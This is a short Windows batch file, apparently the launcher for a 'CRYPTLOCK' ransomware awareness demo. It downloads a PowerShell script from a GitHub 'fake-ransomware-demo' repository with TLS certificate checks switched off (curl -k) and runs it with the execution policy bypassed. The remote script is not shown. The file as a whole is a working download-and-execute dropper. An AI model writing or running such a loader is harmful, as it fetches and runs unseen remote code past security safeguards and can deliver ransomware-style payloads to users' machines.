@echo off
setlocal
title CRYPTLOCK - AWARENESS DEMO
echo Downloading awareness demo...
set "p=%TEMP%\demo.ps1"
curl.exe -k -L "https://raw.githubusercontent.com/kris1019/fake-ransomware-demo/103e8daeaa6081453ee76a02a8d502baa9588176/demo.ps1" -o "%p%"
if errorlevel 1 (
  echo.
  echo ERROR: Could not download the demo.
  echo.
  pause
  exit /b 1
)
echo Starting demo...
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%p%"
set "rc=%ERRORLEVEL%"
if not "%rc%"=="0" (
  echo.
  echo Demo exited with error code %rc%.
  echo.
  pause
)
exit /b %rc%
